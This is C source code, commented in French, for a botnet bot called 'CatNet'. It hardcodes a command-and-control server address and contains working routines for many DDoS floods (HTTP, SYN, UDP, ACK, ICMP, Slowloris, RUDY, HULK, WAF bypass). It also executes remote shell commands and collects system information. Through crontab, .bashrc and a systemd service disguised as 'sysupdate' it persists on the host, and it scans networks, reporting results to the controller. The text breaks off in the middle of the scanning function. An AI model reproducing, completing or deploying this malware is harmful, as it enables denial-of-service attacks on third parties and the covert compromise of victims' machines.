/*
 * Bot optimisé pour le botnet CatNet
 * Capacités améliorées d'infection et d'attaque DDoS
 */

 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <netinet/udp.h>
 #include <netdb.h>
 #include <sys/types.h>
 #include <fcntl.h>
 #include <errno.h>
 #include <time.h>
 #include <signal.h>
 #include <ctype.h>
 #include <dirent.h>
 #include <sys/stat.h>
 #include <sys/wait.h>
 
 #ifdef __linux__
 #include <sys/prctl.h>
 #include <linux/limits.h>
 #endif
 
 // Pour les attaques avancées
 #ifdef __MIPS__
 #define ARCH "MIPS"
 #elif defined(__ARM__)
 #define ARCH "ARM"
 #elif defined(__x86_64__)
 #define ARCH "x86_64"
 #elif defined(__i386__)
 #define ARCH "x86"
 #elif defined(__PPC__)
 #define ARCH "PowerPC"
 #elif defined(__SPARC__)
 #define ARCH "SPARC"
 #else
 #define ARCH "Unknown"
 #endif
 
 // Déclarations des fonctions
 void ddos_attack(int c2_socket, char* target, int port, int duration, char* method);
 void http_flood(char* target, int port, int duration);
 void syn_flood(char* target, int port, int duration);
 void udp_flood(char* target, int port, int duration);
 void tcp_flood(char* target, int port, int duration);
 void ack_flood(char* target, int port, int duration);
 void icmp_flood(char* target, int port, int duration);
 void slowloris_attack(char* target, int port, int duration);
 void rudy_attack(char* target, int port, int duration);
 void arme_attack(char* target, int port, int duration);
 void hulk_attack(char* target, int port, int duration);
 void bypass_attack(char* target, int port, int duration);
 void persist(void);
 void generate_device_id(void);
 void auto_propagate(void);
 void scan_network(int c2_socket, char* subnet);
 char* execute_command(char* command);
 char* collect_system_info(void);
 void connect_to_c2(void);
 void daemonize(void);
 
 #define C2_SERVER "51.68.128.169"
 #define C2_PORT 1337
 #define BUFFER_SIZE 1024
 #define CMD_SIZE 512
 #define DEVICE_ID_SIZE 64
 
 // Identifiant unique pour ce bot
 char device_id[DEVICE_ID_SIZE] = {0};
 
 // User-Agents pour les attaques HTTP
 const char* user_agents[] = {
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/89.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
 };
 
 // Fonction pour exécuter une commande shell et retourner la sortie
 char* execute_command(char* command) {
     FILE* fp;
     char* output = malloc(BUFFER_SIZE * 10);
     char buffer[BUFFER_SIZE];
     
     if (!output) return NULL;
     memset(output, 0, BUFFER_SIZE * 10);
     
     fp = popen(command, "r");
     if (fp == NULL) {
         free(output);
         return NULL;
     }
     
     while (fgets(buffer, sizeof(buffer), fp) != NULL) {
         if (strlen(output) + strlen(buffer) < BUFFER_SIZE * 10 - 1) {
             strcat(output, buffer);
         } else {
             break; // Éviter le débordement de tampon
         }
     }
     
     pclose(fp);
     return output;
 }
 
 // Fonction pour collecter les informations système
 char* collect_system_info(void) {
     char* info = malloc(BUFFER_SIZE * 10);
     char* cmd_output;
     
     if (!info) return NULL;
     memset(info, 0, BUFFER_SIZE * 10);
     
     // Obtenir le hostname
     char hostname[256] = {0};
     gethostname(hostname, sizeof(hostname));
     sprintf(info, "Hostname: %s\nArch: %s\n", hostname, ARCH);
     
     // Obtenir les informations sur le système d'exploitation
     cmd_output = execute_command("uname -a");
     if (cmd_output) {
         strcat(info, "OS: ");
         strcat(info, cmd_output);
         free(cmd_output);
     }
     
     // Obtenir les informations sur le processeur
     cmd_output = execute_command("cat /proc/cpuinfo | grep 'model name' | head -n1");
     if (cmd_output) {
         strcat(info, "CPU: ");
         strcat(info, cmd_output);
         free(cmd_output);
     }
     
     // Obtenir les informations sur la mémoire
     cmd_output = execute_command("free -m | grep Mem");
     if (cmd_output) {
         strcat(info, "Memory: ");
         strcat(info, cmd_output);
         free(cmd_output);
     }
     
     // Obtenir les informations réseau
     cmd_output = execute_command("ifconfig | grep inet");
     if (cmd_output) {
         strcat(info, cmd_output);
         free(cmd_output);
     }
     
     return info;
 }
 
 // Fonction pour exécuter une attaque DDoS par inondation HTTP
 void http_flood(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     char request[BUFFER_SIZE];
     char paths[10][32] = {
         "/", "/index.html", "/api/", "/login", "/admin",
         "/search", "/products", "/cart", "/checkout", "/contact"
     };
     
     // Initialiser la structure d'adresse cible
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port);
     inet_pton(AF_INET, target, &target_addr.sin_addr);
     
     // Boucle d'attaque pendant la durée spécifiée
     while (time(NULL) - start_time < duration) {
         // Créer un nouveau socket pour chaque requête
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock != -1) {
             // Configurer un timeout court
             struct timeval timeout;
             timeout.tv_sec = 1;
             timeout.tv_usec = 0;
             setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
             setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
             
             // Tenter de se connecter
             if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) >= 0) {
                 // Sélectionner un User-Agent aléatoire
                 const char* user_agent = user_agents[rand() % (sizeof(user_agents) / sizeof(user_agents[0]))];
                 
                 // Sélectionner un chemin aléatoire
                 char* path = paths[rand() % 10];
                 
                 // Construire une requête HTTP GET
                 snprintf(request, BUFFER_SIZE,
                     "GET %s?%d HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                     "Accept-Language: en-US,en;q=0.5\r\n"
                     "Accept-Encoding: gzip, deflate\r\n"
                     "Connection: keep-alive\r\n"
                     "Cache-Control: no-cache\r\n"
                     "Pragma: no-cache\r\n\r\n",
                     path, rand(), target, user_agent);
                 
                 // Envoyer la requête
                 send(sock, request, strlen(request), 0);
                 
                 // Lire la réponse (pour simuler un client légitime)
                 char response[1024];
                 recv(sock, response, sizeof(response), 0);
             }
             close(sock);
         }
         usleep(10000); // 10ms délai entre les requêtes
     }
 }
 
 // Fonction pour exécuter une attaque DDoS par inondation SYN
 void syn_flood(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     
     // Initialiser la structure d'adresse cible
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port);
     inet_pton(AF_INET, target, &target_addr.sin_addr);
     
     #ifdef __linux__
     // Sur Linux, on peut utiliser des raw sockets pour le SYN flood
     sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (sock != -1) {
         // Définir les options du socket
         int one = 1;
         if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
             close(sock);
         } else {
             // Créer un paquet SYN basique
             char syn_packet[60]; // En-tête IP (20) + En-tête TCP (40)
             memset(syn_packet, 0, sizeof(syn_packet));
             
             // Remplir avec des données aléatoires pour simuler un paquet SYN
             for (int i = 0; i < sizeof(syn_packet); i++) {
                 syn_packet[i] = rand() % 256;
             }
             
             while (time(NULL) - start_time < duration) {
                 sendto(sock, syn_packet, sizeof(syn_packet), 0,
                        (struct sockaddr*)&target_addr, sizeof(target_addr));
                 usleep(1000);
             }
             close(sock);
         }
     }
     #else
     // Sur les autres systèmes, on simule un SYN flood avec des connexions partielles
     while (time(NULL) - start_time < duration) {
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock != -1) {
             // Rendre le socket non-bloquant
             int flags = fcntl(sock, F_GETFL, 0);
             fcntl(sock, F_SETFL, flags | O_NONBLOCK);
             
             // Initier la connexion mais ne pas la compléter
             connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
             
             // Ne pas fermer le socket pour garder la connexion semi-ouverte
             // mais ne pas dépasser le nombre maximum de descripteurs de fichiers
             // donc on le ferme après un court délai
             usleep(10000);
             close(sock);
         }
         usleep(1000);
     }
     #endif
 }
 
 // Fonction pour exécuter une attaque DDoS par inondation UDP
 void udp_flood(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     char attack_packet[8192]; // Augmentation de la taille du paquet pour plus d'impact
     int packet_size = sizeof(attack_packet);
     
     // Initialiser la structure d'adresse cible
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port);
     inet_pton(AF_INET, target, &target_addr.sin_addr);
     
     // Remplir le paquet avec des données aléatoires
     for (int i = 0; i < packet_size; i++) {
         attack_packet[i] = rand() % 256;
     }
     
     // Créer un socket UDP
     sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
     if (sock != -1) {
         // Optimisation: désactiver le blocage pour des envois plus rapides
         int flags = fcntl(sock, F_GETFL, 0);
         fcntl(sock, F_SETFL, flags | O_NONBLOCK);
         
         // Boucle d'attaque pendant la durée spécifiée
         while (time(NULL) - start_time < duration) {
             // Envoyer plusieurs paquets par itération pour augmenter l'intensité
             for (int i = 0; i < 100; i++) {
                 // Varier les ports pour contourner les filtres
                 target_addr.sin_port = htons(port + (rand() % 100));
                 sendto(sock, attack_packet, packet_size, 0,
                        (struct sockaddr*)&target_addr, sizeof(target_addr));
             }
             usleep(100); // Réduire le délai pour plus d'intensité
         }
         close(sock);
     }
 }
 
 // Fonction pour exécuter une attaque DDoS par inondation TCP
 void tcp_flood(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     
     // Initialiser la structure d'adresse cible
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port);
     inet_pton(AF_INET, target, &target_addr.sin_addr);
     
     // Boucle d'attaque pendant la durée spécifiée
     while (time(NULL) - start_time < duration) {
         // Créer un nouveau socket pour chaque connexion
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock != -1) {
             // Rendre le socket non-bloquant
             int flags = fcntl(sock, F_GETFL, 0);
             fcntl(sock, F_SETFL, flags | O_NONBLOCK);
             
             // Tenter de se connecter
             connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
             
             // Ne pas attendre la connexion, fermer immédiatement
             close(sock);
         }
         usleep(100); // Réduire le délai pour plus d'intensité
     }
 }
 
 // Fonction pour exécuter une attaque DDoS par inondation ACK
 void ack_flood(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     
     // Initialiser la structure d'adresse cible
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port);
     inet_pton(AF_INET, target, &target_addr.sin_addr);
     
     // Créer un socket raw pour les paquets TCP
     sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (sock != -1) {
         // Configurer les options du socket
         int one = 1;
         if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
             close(sock);
             return;
         }
         
         // Préparer un paquet ACK basique
         char packet[60]; // En-tête IP (20) + En-tête TCP (40)
         memset(packet, 0, sizeof(packet));
         
         // Boucle d'attaque pendant la durée spécifiée
         while (time(NULL) - start_time < duration) {
             // Remplir avec des données aléatoires pour simuler un paquet ACK
             for (int i = 0; i < sizeof(packet); i++) {
                 packet[i] = rand() % 256;
             }
             
             // Envoyer le paquet
             sendto(sock, packet, sizeof(packet), 0,
                    (struct sockaddr*)&target_addr, sizeof(target_addr));
             usleep(100);
         }
         close(sock);
     }
 }
 
 // Fonction pour exécuter une attaque DDoS par inondation ICMP (ping flood)
 void icmp_flood(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     
     // Initialiser la structure d'adresse cible
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port); // Le port n'est pas utilisé pour ICMP
     inet_pton(AF_INET, target, &target_addr.sin_addr);
     
     // Créer un socket raw pour les paquets ICMP
     sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
     if (sock != -1) {
         // Configurer les options du socket
         int one = 1;
         if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
             close(sock);
             return;
         }
         
         // Préparer un paquet ICMP basique
         char packet[64]; // En-tête IP (20) + En-tête ICMP (8) + Données (36)
         memset(packet, 0, sizeof(packet));
         
         // Boucle d'attaque pendant la durée spécifiée
         while (time(NULL) - start_time < duration) {
             // Remplir avec des données aléatoires pour simuler un paquet ICMP
             for (int i = 0; i < sizeof(packet); i++) {
                 packet[i] = rand() % 256;
             }
             
             // Envoyer le paquet
             sendto(sock, packet, sizeof(packet), 0,
                    (struct sockaddr*)&target_addr, sizeof(target_addr));
             usleep(100);
         }
         close(sock);
     } else {
         // Fallback: utiliser la commande ping si le socket raw n'est pas disponible
         char ping_cmd[256];
         snprintf(ping_cmd, sizeof(ping_cmd), "ping -c 1 -W 1 %s > /dev/null 2>&1 &", target);
         
         while (time(NULL) - start_time < duration) {
             system(ping_cmd);
             usleep(100);
         }
     }
 }
 
 // Fonction pour exécuter une attaque Slowloris
 void slowloris_attack(char* target, int port, int duration) {
     int max_sockets = 1000; // Nombre maximum de connexions simultanées
     int *sockets = (int*)malloc(max_sockets * sizeof(int));
     int active_sockets = 0;
     time_t start_time = time(NULL);
     struct sockaddr_in target_addr;
     
     if (!sockets) return; // Échec d'allocation mémoire
     
     // Initialiser la structure d'adresse cible
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port);
     inet_pton(AF_INET, target, &target_addr.sin_addr);
     
     // Préparer l'en-tête de la requête HTTP partielle
     char partial_header[BUFFER_SIZE];
     snprintf(partial_header, BUFFER_SIZE,
         "GET / HTTP/1.1\r\n"
         "Host: %s\r\n"
         "User-Agent: %s\r\n"
         "Content-Length: 42\r\n",
         target, user_agents[rand() % (sizeof(user_agents) / sizeof(user_agents[0]))]);
     
     // Boucle d'attaque pendant la durée spécifiée
     while (time(NULL) - start_time < duration) {
         // Ouvrir de nouvelles connexions si nécessaire
         while (active_sockets < max_sockets) {
             int sock = socket(AF_INET, SOCK_STREAM, 0);
             if (sock != -1) {
                 // Rendre le socket non-bloquant
                 int flags = fcntl(sock, F_GETFL, 0);
                 fcntl(sock, F_SETFL, flags | O_NONBLOCK);
                 
                 // Tenter de se connecter
                 int res = connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
                 if (res >= 0 || errno == EINPROGRESS) {
                     // Envoyer l'en-tête partiel
                     send(sock, partial_header, strlen(partial_header), 0);
                     sockets[active_sockets++] = sock;
                 } else {
                     close(sock);
                 }
             }
             
             // Limiter le nombre de tentatives de connexion par itération
             if (active_sockets % 100 == 0) {
                 usleep(100000); // 100ms
             }
         }
         
         // Envoyer des données partielles pour maintenir les connexions ouvertes
         for (int i = 0; i < active_sockets; i++) {
             char keep_alive[2] = "X";
             send(sockets[i], keep_alive, 1, 0);
         }
         
         // Attendre avant d'envoyer plus de données
         sleep(10);
         
         // Nettoyer les sockets morts et les remplacer
         for (int i = 0; i < active_sockets; i++) {
             if (send(sockets[i], "", 0, 0) < 0) {
                 close(sockets[i]);
                 sockets[i] = sockets[--active_sockets];
                 i--;
             }
         }
     }
     
     // Nettoyer
     for (int i = 0; i < active_sockets; i++) {
         close(sockets[i]);
     }
     free(sockets);
 }
 
 // Fonction pour exécuter une attaque R-U-Dead-Yet (RUDY)
 void rudy_attack(char* target, int port, int duration) {
     int max_sockets = 150;
     int *sockets = (int*)malloc(max_sockets * sizeof(int));
     int active_sockets = 0;
     time_t start_time = time(NULL);
     struct sockaddr_in target_addr;
     
     if (!sockets) return; // Échec d'allocation mémoire
     
     // Initialiser la structure d'adresse cible
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(port);
     inet_pton(AF_INET, target, &target_addr.sin_addr);
     
     // Préparer l'en-tête de la requête POST
     char post_header[BUFFER_SIZE];
     snprintf(post_header, BUFFER_SIZE,
         "POST /login HTTP/1.1\r\n"
         "Host: %s\r\n"
         "User-Agent: %s\r\n"
         "Content-Type: application/x-www-form-urlencoded\r\n"
         "Content-Length: 1000000\r\n\r\n",
         target, user_agents[rand() % (sizeof(user_agents) / sizeof(user_agents[0]))]);
     
     while (time(NULL) - start_time < duration) {
         // Maintenir plusieurs connexions
         while (active_sockets < max_sockets) {
             int sock = socket(AF_INET, SOCK_STREAM, 0);
             if (sock != -1) {
                 // Rendre le socket non-bloquant
                 int flags = fcntl(sock, F_GETFL, 0);
                 fcntl(sock, F_SETFL, flags | O_NONBLOCK);
                 
                 if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) >= 0 ||
                     errno == EINPROGRESS) {
                     // Envoyer l'en-tête POST
                     send(sock, post_header, strlen(post_header), 0);
                     sockets[active_sockets++] = sock;
                 } else {
                     close(sock);
                 }
             }
         }
         
         // Envoyer des données très lentement pour chaque socket
         for (int i = 0; i < active_sockets; i++) {
             // Envoyer un seul caractère à la fois
             send(sockets[i], "A", 1, 0);
         }
         
         // Attendre avant d'envoyer le prochain caractère
         sleep(10);
         
         // Nettoyer les sockets morts
         for (int i = 0; i < active_sockets; i++) {
             if (send(sockets[i], "", 0, 0) < 0) {
                 close(sockets[i]);
                 sockets[i] = sockets[--active_sockets];
                 i--;
             }
         }
     }
     
     // Nettoyer
     for (int i = 0; i < active_sockets; i++) {
         close(sockets[i]);
     }
     free(sockets);
 }
 
 // Fonction pour exécuter une attaque ARME (Amplification de Réflexion de Mémoire)
 void arme_attack(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     
     // Liste de chemins connus pour générer de grandes réponses
     char *amplification_paths[] = {
         "/search?q=", "/api/all", "/products?limit=1000", "/users/list", "/data/export"
     };
     
     while (time(NULL) - start_time < duration) {
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock != -1) {
             // Initialiser la structure d'adresse cible
             memset(&target_addr, 0, sizeof(target_addr));
             target_addr.sin_family = AF_INET;
             target_addr.sin_port = htons(port);
             inet_pton(AF_INET, target, &target_addr.sin_addr);
             
             if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) >= 0) {
                 // Sélectionner un chemin d'amplification aléatoire
                 char *path = amplification_paths[rand() % (sizeof(amplification_paths) / sizeof(amplification_paths[0]))];
                 
                 // Construire une requête qui génère une grande réponse
                 char request[BUFFER_SIZE];
                 snprintf(request, BUFFER_SIZE,
                     "GET %s%d HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Accept: */*\r\n\r\n",
                     path, rand(), target, user_agents[rand() % (sizeof(user_agents) / sizeof(user_agents[0]))]);
                 
                 send(sock, request, strlen(request), 0);
             }
             close(sock);
         }
         usleep(5000);
     }
 }
 
 // Fonction pour exécuter une attaque HULK (HTTP Unbearable Load King)
 void hulk_attack(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     
     // Générer des chemins aléatoires pour contourner le cache
     char random_path[32];
     
     while (time(NULL) - start_time < duration) {
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock != -1) {
             // Initialiser la structure d'adresse cible
             memset(&target_addr, 0, sizeof(target_addr));
             target_addr.sin_family = AF_INET;
             target_addr.sin_port = htons(port);
             inet_pton(AF_INET, target, &target_addr.sin_addr);
             
             if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) >= 0) {
                 // Générer un chemin aléatoire pour contourner le cache
                 for (int i = 0; i < 10; i++) {
                     random_path[i] = 'a' + (rand() % 26);
                 }
                 random_path[10] = '?';
                 for (int i = 11; i < 30; i++) {
                     random_path[i] = 'a' + (rand() % 26);
                 }
                 random_path[30] = '=';
                 random_path[31] = '\0';
                 
                 // Construire une requête avec des en-têtes aléatoires
                 char request[BUFFER_SIZE];
                 snprintf(request, BUFFER_SIZE,
                     "GET /%s%d HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                     "Accept-Language: en-US,en;q=0.5\r\n"
                     "Accept-Encoding: gzip, deflate\r\n"
                     "DNT: 1\r\n"
                     "Connection: keep-alive\r\n"
                     "Cache-Control: no-cache\r\n"
                     "Pragma: no-cache\r\n\r\n",
                     random_path, rand(), target, user_agents[rand() % (sizeof(user_agents) / sizeof(user_agents[0]))]);
                 
                 send(sock, request, strlen(request), 0);
             }
             close(sock);
         }
         usleep(1000);
     }
 }
 
 // Fonction pour exécuter une attaque avec contournement de protection WAF
 void bypass_attack(char* target, int port, int duration) {
     int sock;
     struct sockaddr_in target_addr;
     time_t start_time = time(NULL);
     
     // Techniques de contournement WAF
     char *bypass_techniques[] = {
         "X-Forwarded-For: 127.0.0.1\r\n",
         "X-Originating-IP: 127.0.0.1\r\n",
         "X-Remote-IP: 127.0.0.1\r\n",
         "X-Remote-Addr: 127.0.0.1\r\n",
         "X-Client-IP: 127.0.0.1\r\n"
     };
     
     while (time(NULL) - start_time < duration) {
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock != -1) {
             // Initialiser la structure d'adresse cible
             memset(&target_addr, 0, sizeof(target_addr));
             target_addr.sin_family = AF_INET;
             target_addr.sin_port = htons(port);
             inet_pton(AF_INET, target, &target_addr.sin_addr);
             
             if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) >= 0) {
                 // Sélectionner une technique de contournement aléatoire
                 char *bypass = bypass_techniques[rand() % (sizeof(bypass_techniques) / sizeof(bypass_techniques[0]))];
                 
                 // Construire une requête avec des en-têtes de contournement
                 char request[BUFFER_SIZE];
                 snprintf(request, BUFFER_SIZE,
                     "GET /?%d HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "%s"
                     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                     "Accept-Language: en-US,en;q=0.5\r\n"
                     "Accept-Encoding: gzip, deflate\r\n"
                     "Connection: keep-alive\r\n"
                     "Cache-Control: no-cache\r\n\r\n",
                     rand(), target, user_agents[rand() % (sizeof(user_agents) / sizeof(user_agents[0]))], bypass);
                 
                 send(sock, request, strlen(request), 0);
             }
             close(sock);
         }
         usleep(1000);
     }
 }
 
 // Fonction principale pour exécuter une attaque DDoS
 void ddos_attack(int c2_socket, char* target, int port, int duration, char* method) {
     // Envoyer un message de confirmation au serveur C2
     char msg[BUFFER_SIZE];
     snprintf(msg, BUFFER_SIZE, "ATTACK_STARTED|%s:%d|%s|%d", target, port, method, duration);
     send(c2_socket, msg, strlen(msg), 0);
     
     // Sélectionner la méthode d'attaque appropriée
     if (strcmp(method, "HTTP") == 0) {
         http_flood(target, port, duration);
     } else if (strcmp(method, "SYN") == 0) {
         syn_flood(target, port, duration);
     } else if (strcmp(method, "UDP") == 0) {
         udp_flood(target, port, duration);
     } else if (strcmp(method, "TCP") == 0) {
         tcp_flood(target, port, duration);
     } else if (strcmp(method, "ACK") == 0) {
         ack_flood(target, port, duration);
     } else if (strcmp(method, "ICMP") == 0) {
         icmp_flood(target, port, duration);
     } else if (strcmp(method, "SLOWLORIS") == 0) {
         slowloris_attack(target, port, duration);
     } else if (strcmp(method, "RUDY") == 0) {
         rudy_attack(target, port, duration);
     } else if (strcmp(method, "ARME") == 0) {
         arme_attack(target, port, duration);
     } else if (strcmp(method, "HULK") == 0) {
         hulk_attack(target, port, duration);
     } else if (strcmp(method, "BYPASS") == 0) {
         bypass_attack(target, port, duration);
     } else {
         // Méthode par défaut : combinaison de plusieurs attaques
         pid_t pid;
         
         // Lancer plusieurs types d'attaques en parallèle
         if ((pid = fork()) == 0) {
             http_flood(target, port, duration);
             exit(0);
         }
         
         if ((pid = fork()) == 0) {
             syn_flood(target, port, duration);
             exit(0);
         }
         
         if ((pid = fork()) == 0) {
             udp_flood(target, port, duration);
             exit(0);
         }
         
         // Le processus parent attend la durée spécifiée
         sleep(duration);
         
         // Envoyer un message de fin d'attaque
         snprintf(msg, BUFFER_SIZE, "ATTACK_FINISHED|%s:%d|%s", target, port, method);
         send(c2_socket, msg, strlen(msg), 0);
         return;
     }
     
     // Envoyer un message de fin d'attaque
     snprintf(msg, BUFFER_SIZE, "ATTACK_FINISHED|%s:%d|%s", target, port, method);
     send(c2_socket, msg, strlen(msg), 0);
 }
 
 // Fonction pour générer un identifiant de périphérique unique
 void generate_device_id() {
     // Utiliser des informations matérielles pour générer un ID unique
     FILE *fp;
     char buffer[BUFFER_SIZE];
     unsigned long hash = 5381;
     int c;
     
     // Essayer d'obtenir le numéro de série du processeur
     fp = fopen("/proc/cpuinfo", "r");
     if (fp) {
         while (fgets(buffer, BUFFER_SIZE, fp)) {
             if (strstr(buffer, "Serial") || strstr(buffer, "serial") || 
                 strstr(buffer, "Unique ID") || strstr(buffer, "Hardware")) {
                 // Utiliser cette ligne pour le hachage
                 for (int i = 0; i < strlen(buffer); i++) {
                     c = buffer[i];
                     hash = ((hash << 5) + hash) + c; // hash * 33 + c
                 }
             }
         }
         fclose(fp);
     }
     
     // Ajouter l'adresse MAC pour plus d'unicité
     fp = popen("cat /sys/class/net/*/address | head -n 1", "r");
     if (fp) {
         if (fgets(buffer, BUFFER_SIZE, fp)) {
             for (int i = 0; i < strlen(buffer); i++) {
                 c = buffer[i];
                 hash = ((hash << 5) + hash) + c;
             }
         }
         pclose(fp);
     }
     
     // Ajouter le hostname
     char hostname[256];
     if (gethostname(hostname, sizeof(hostname)) == 0) {
         for (int i = 0; i < strlen(hostname); i++) {
             c = hostname[i];
             hash = ((hash << 5) + hash) + c;
         }
     }
     
     // Générer l'ID final
     snprintf(device_id, DEVICE_ID_SIZE, "%s-%lx", ARCH, hash);
 }
 
 // Fonction pour assurer la persistance du malware
 void persist() {
     char current_path[PATH_MAX];
     char cmd[PATH_MAX + 100]; // Augmenter la taille pour éviter la troncature
     
     // Obtenir le chemin absolu de l'exécutable actuel
     if (readlink("/proc/self/exe", current_path, PATH_MAX) == -1) {
         return;
     }
     
     // Vérifier que le chemin n'est pas trop long
     if (strlen(current_path) >= PATH_MAX - 50) {
         // Chemin trop long, utiliser un chemin relatif ou tronqué
         strncpy(current_path, "./bot", PATH_MAX);
     }
     
     // Créer un répertoire caché dans le dossier personnel de l'utilisateur
     system("mkdir -p ~/.system");
     
     // Copier l'exécutable dans le répertoire caché
     snprintf(cmd, sizeof(cmd), "cp %s ~/.system/sysupdate", current_path);
     system(cmd);
     
     // Rendre l'exécutable exécutable
     system("chmod +x ~/.system/sysupdate");
     
     // Ajouter au crontab pour le démarrage automatique
     FILE *fp = fopen("/tmp/crontab_temp", "w");
     if (fp) {
         fprintf(fp, "@reboot ~/.system/sysupdate\n");
         fprintf(fp, "*/30 * * * * ~/.system/sysupdate\n");
         fclose(fp);
         system("crontab /tmp/crontab_temp");
         system("rm /tmp/crontab_temp");
     }
     
     // Ajouter au fichier .bashrc pour la persistance
     fp = fopen("/tmp/bashrc_append", "w");
     if (fp) {
         fprintf(fp, "\n# System Update Service\n~/.system/sysupdate &\n");
         fclose(fp);
         system("cat /tmp/bashrc_append >> ~/.bashrc");
         system("rm /tmp/bashrc_append");
     }
     
     // Créer un service systemd si possible
     fp = fopen("/tmp/sysupdate.service", "w");
     if (fp) {
         fprintf(fp, "[Unit]\nDescription=System Update Service\nAfter=network.target\n\n");
         fprintf(fp, "[Service]\nExecStart=~/.system/sysupdate\nRestart=always\nRestartSec=60\n\n");
         fprintf(fp, "[Install]\nWantedBy=multi-user.target\n");
         fclose(fp);
         system("sudo mv /tmp/sysupdate.service /etc/systemd/system/ 2>/dev/null");
         system("sudo systemctl enable sysupdate.service 2>/dev/null");
         system("sudo systemctl start sysupdate.service 2>/dev/null");
     }
 }
 
 // Fonction pour exécuter un scan réseau simple
 void scan_network(int c2_socket, char* subnet) {
     char cmd[BUFFER_SIZE];
     char *output;
     char msg[BUFFER_SIZE];
     
     // Informer le serveur C2 que le scan a commencé
     snprintf(msg, BUFFER_SIZE, "SCAN_STARTED|%s", subnet);
     send(c2_socket, msg, strlen(msg), 0);
     
     // Exécuter un scan ping simple
     snprintf(cmd, BUFFER_SIZE, "ping -c 1 -W 1 %s.1 2>/dev/null | grep 'bytes from'", subnet);
     output = execute_command(cmd);
     if (output) {
         snprintf(msg, BUFFER_SIZE, "SCAN_RESULT|%s|%s", subnet, output);
